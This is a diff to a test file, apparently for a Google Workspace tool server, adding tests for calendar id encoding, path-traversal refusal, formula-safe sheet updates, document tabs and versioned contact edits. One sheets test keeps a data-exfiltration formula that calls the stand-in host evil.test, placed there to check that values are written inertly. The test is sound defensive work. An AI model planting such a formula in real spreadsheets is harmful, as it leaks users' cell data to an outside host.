@@ -120,6 +120,22 @@ describe('calendar', () => {
     expect(calls).toEqual([]);
   });
 
+  it("reads a calendar of Google's own with # in its id, as one path segment", async () => {
+    const id = 'en.danish#holiday@group.v.calendar.google.com';
+    const { result, calls } = await call(
+      { [`GET ${CAL}/calendars/en.danish%23holiday%40group.v.calendar.google.com/events`]: { body: { items: [] } } },
+      'list_events',
+      { calendarId: id },
+    );
+    expect(result.isError, result.content[0]?.text).toBeUndefined();
+    expect(new URL(calls[0]!.url).pathname).toBe('/calendar/v3/calendars/en.danish%23holiday%40group.v.calendar.google.com/events');
+    for (const bad of ['..', '.', 'a/b', 'a?b']) {
+      const refused = await call({}, 'list_events', { calendarId: bad });
+      expect(refused.result.isError, bad).toBe(true);
+      expect(refused.calls, bad).toEqual([]);
+    }
+  });
+
   it('creates an event without sending mail, with a time zone or as a whole day', async () => {
     const routes = { [`POST ${EVENTS}`]: { body: EVENT } };
     const timed = await call(routes, 'create_event', {
@@ -227,6 +243,19 @@ describe('sheets', () => {
     expect(query(calls[1]!.url)).toEqual({ valueInputOption: 'RAW' });
     expect(calls[1]!.body).toEqual({ range: 'Ark1!A1:C3', majorDimension: 'ROWS', values: [['=IMPORTDATA("https://evil.test/"&A2)', 12400]] });
     expect(data).toEqual({ updatedRange: 'Ark1!A1:B1', updatedRows: 1, updatedCells: 2, before: { range: 'Ark1!A1:C3', values: [['gammel']] } });
+    // The values before are read unformatted, with formulas as formulas.
+    expect(query(calls[0]!.url)).toEqual({ majorDimension: 'ROWS', valueRenderOption: 'FORMULA' });
+  });
+
+  it('does not overwrite a range that holds formulas, since RAW could not put them back', async () => {
+    const { result, calls } = await call(
+      { [`GET ${RANGE}`]: { body: { range: 'Ark1!A1:C3', majorDimension: 'ROWS', values: [['Sum', '=SUM(B2:B9)']] } } },
+      'update_range',
+      { spreadsheet: SHEET_ID, range: 'Ark1!A1:C3', values: [['x']] },
+    );
+    expect(result.isError).toBe(true);
+    expect(result.content[0]?.text).toMatch(/formulas/);
+    expect(calls.map(c => c.method)).toEqual(['GET']);
   });
 
   it('adds rows after the table, as RAW', async () => {
@@ -310,6 +339,21 @@ describe('docs', () => {
     expect(data).toEqual({ documentId: DOC_ID, title: 'Referat', revisionId: 'ALm37BV', text: 'Referat\nPunkt\tAnsvarlig\nNæste møde tirsdag.\n', length: 44 });
   });
 
+  it('reads every tab, child tabs included, when the document has tabs', async () => {
+    const tab = (title: string, text: string, childTabs: unknown[] = []) => ({
+      tabProperties: { tabId: `t.${title}`, title, index: 0 },
+      documentTab: { body: { content: [{ paragraph: { elements: [{ textRun: { content: text } }] } }] } },
+      childTabs,
+    });
+    const { data, calls } = await call(
+      { [`GET ${DOCS}/documents/${DOC_ID}`]: { body: { documentId: DOC_ID, title: 'Håndbog', revisionId: 'r2', tabs: [tab('Ferie', 'Tre uger.\n', [tab('Jul', 'Lukket.\n')]), tab('Løn', 'Den sidste.\n')] } } },
+      'get_document',
+      { document: DOC_ID },
+    );
+    expect(query(calls[0]!.url)).toEqual({ includeTabsContent: 'true' });
+    expect(data.text).toBe('# Ferie\nTre uger.\n\n# Jul\nLukket.\n\n# Løn\nDen sidste.\n');
+  });
+
   it('adds text at the end, and nothing else', async () => {
     const { data, calls } = await call(
       { [`POST ${DOCS}/documents/${DOC_ID}:batchUpdate`]: { body: { documentId: DOC_ID, replies: [{}], writeControl: { requiredRevisionId: 'ALm37BW' } } } },
@@ -342,6 +386,13 @@ describe('contacts', () => {
     emailAddresses: [{ metadata: { primary: true }, value: 'anna@example.dk' }],
     phoneNumbers: [{ value: '+45 12 34 56 78', canonicalForm: '+4512345678' }],
     organizations: [{ name: 'Demo Byg ApS', title: 'Projektleder' }],
+    metadata: {
+      sources: [
+        { type: 'CONTACT', id: '6301234567890abc', etag: '#AxBQXhMWF0E=', updateTime: '2026-11-20T10:00:00.000Z' },
+        { type: 'PROFILE', id: '110169484474386276334', etag: '#Profil=', profileMetadata: { objectType: 'PERSON' } },
+      ],
+      objectType: 'PERSON',
+    },
   };
   const SHAPED = {
     resourceName: 'people/c7142250453257580122',
@@ -367,7 +418,9 @@ describe('contacts', () => {
     expect(listed.data).toEqual({ contacts: [SHAPED], totalItems: 1 });
 
     const searched = await call({ [`GET ${PEOPLE}/people:searchContacts`]: { body: { results: [{ person: PERSON }] } } }, 'search_contacts', { query: 'Anna' });
-    expect(query(searched.calls[0]!.url)).toEqual({ query: 'Anna', readMask: 'names,emailAddresses,phoneNumbers,organizations', pageSize: '10' });
+    // First the warm-up request with an empty query that Google asks for, then the search.
+    expect(query(searched.calls[0]!.url)).toEqual({ query: '', readMask: 'names,emailAddresses,phoneNumbers,organizations' });
+    expect(query(searched.calls[1]!.url)).toEqual({ query: 'Anna', readMask: 'names,emailAddresses,phoneNumbers,organizations', pageSize: '10' });
     expect(searched.data).toEqual({ contacts: [SHAPED] });
   });
 
@@ -396,9 +449,37 @@ describe('contacts', () => {
       'update_contact',
       { contact: `people/${id}`, phones: ['+45 87 65 43 21'] },
     );
+    expect(query(calls[0]!.url)).toEqual({ personFields: 'names,emailAddresses,phoneNumbers,organizations,metadata' });
     expect(query(calls[1]!.url)).toEqual({ updatePersonFields: 'phoneNumbers', personFields: 'names,emailAddresses,phoneNumbers,organizations' });
-    expect(calls[1]!.body).toEqual({ phoneNumbers: [{ value: '+45 87 65 43 21' }], etag: PERSON.etag });
+    expect(calls[1]!.body).toEqual({
+      phoneNumbers: [{ value: '+45 87 65 43 21' }],
+      etag: PERSON.etag,
+      metadata: { sources: [{ type: 'CONTACT', id: '6301234567890abc', etag: '#AxBQXhMWF0E=' }] },
+    });
     expect(data.before).toEqual({ phones: ['+45 12 34 56 78'] });
+  });
+
+  it('keeps the parts of the name and the company that are not given', async () => {
+    const id = 'c7142250453257580122';
+    const routes = {
+      [`GET ${PEOPLE}/people/${id}`]: { body: PERSON },
+      [`PATCH ${PEOPLE}/people/${id}:updateContact`]: { body: PERSON },
+    };
+    const name = await call(routes, 'update_contact', { contact: id, givenName: 'Anne' });
+    expect((name.calls[1]!.body as Record<string, unknown>).names).toEqual([{ givenName: 'Anne', familyName: 'Jensen' }]);
+    const company = await call(routes, 'update_contact', { contact: id, organization: { name: 'Demo Ejendomme ApS' } });
+    expect((company.calls[1]!.body as Record<string, unknown>).organizations).toEqual([{ name: 'Demo Ejendomme ApS', title: 'Projektleder' }]);
+  });
+
+  it('changes nothing when Google gives no contact source with its version', async () => {
+    const id = 'c7142250453257580122';
+    const { result, calls } = await call(
+      { [`GET ${PEOPLE}/people/${id}`]: { body: { ...PERSON, metadata: { sources: [{ type: 'PROFILE', id: 'p1', etag: 'e' }] } } } },
+      'update_contact',
+      { contact: id, phones: ['+45 87 65 43 21'] },
+    );
+    expect(result.isError).toBe(true);
+    expect(calls.map(c => c.method)).toEqual(['GET']);
   });
 });
 
